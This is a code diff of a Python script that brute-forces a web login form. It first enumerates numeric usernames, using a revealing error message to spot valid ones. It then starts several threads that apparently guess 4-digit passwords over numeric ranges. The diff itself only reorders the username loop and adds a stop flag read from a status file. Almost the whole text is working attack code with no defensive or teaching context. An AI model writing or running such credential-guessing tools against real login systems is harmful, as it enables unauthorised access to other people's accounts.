@@ -25,25 +25,6 @@ while len(username_main)!=length:username_main = str(username_main)+"0"
 
 username_number = int(username_main)
 
-while(True):
-    username_number += 1
-    username = username_number
-    print(username)
-    body = {
-        "txtLogin":username,
-        "txtPasswd":username,
-        "btnLogin":"Login",
-        "reqUrl":"https://google.com/",
-        "reqCheck":"false"
-    }
-
-    try:
-        res = request_session.post(url=url,headers=header,data=body)
-        if "Loginname or Password is invalid! (2)" in res.text:
-            print(f"Username is : {username}")
-            break
-    except:pass
-
 def getRun():
     df = open('app_status.txt', 'r', encoding='utf-8')
     return df.read()
@@ -82,8 +63,32 @@ def BrutforcePassword(start,end,length):
                 setRun("0")
         except:
             pass
+
+setRun("1")
+# Brute force Username
+while(True):
+    if getRun()=='0': break
+    username_number += 1
+    username = username_number
+    print(username)
+    body = {
+        "txtLogin":username,
+        "txtPasswd":username,
+        "btnLogin":"Login",
+        "reqUrl":"https://google.com/",
+        "reqCheck":"false"
+    }
+
+    try:
+        res = request_session.post(url=url,headers=header,data=body)
+        print(res.text)
+        if "Loginname or Password is invalid! (2)" in res.text:
+            print(f"Username is : {username}")
+            break
+    except:pass
 setRun("1")
 
+# Brute force Password
 threading.Thread(target=BrutforcePassword,args=(0,1000,4,)).start()
 threading.Thread(target=BrutforcePassword,args=(1000,2000,4,)).start()
 threading.Thread(target=BrutforcePassword,args=(2000,3000,4,)).start()
